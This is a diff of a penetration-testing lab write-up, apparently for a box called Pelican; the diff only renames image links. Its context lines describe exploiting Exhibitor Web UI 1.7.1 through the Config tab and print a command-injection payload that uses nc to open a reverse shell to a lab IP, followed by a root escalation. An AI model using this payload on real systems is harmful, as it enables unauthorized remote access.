@@ -68,7 +68,7 @@ Exhibitor Web UI 1.7.1 - Remote Code Execution             | java/webapps/48654.
 
 The Exhibitor RCE is rather simple, and the Config tab looks rather vulnerable.
 
-![](<../../../.gitbook/assets/image%20(1803).png>)
+![](../../../.gitbook/assets/pelican-3.png)
 
 The `java.env` script part seems to be running `bash`. I downloaded the exploit found from `searchsploit`, and attempted their POC:
 
@@ -76,11 +76,11 @@ The `java.env` script part seems to be running `bash`. I downloaded the exploit 
 $(nc -e /bin/bash 192.168.45.182 4444)
 ```
 
-![](<../../../.gitbook/assets/image%20(1343).png>)
+![](../../../.gitbook/assets/pelican-2.png)
 
 Afterwards, committing the changes would give us a reverse shell:
 
-![](<../../../.gitbook/assets/image%20(3318).png>)
+![](../../../.gitbook/assets/pelican-4.png)
 
 ## Privilege Escalation
 
@@ -132,4 +132,4 @@ x86_64
 
 Using this password, we can `su` to `root`:
 
-![](<../../../.gitbook/assets/image%20(1254).png>)
+![](../../../.gitbook/assets/pelican-1.png)
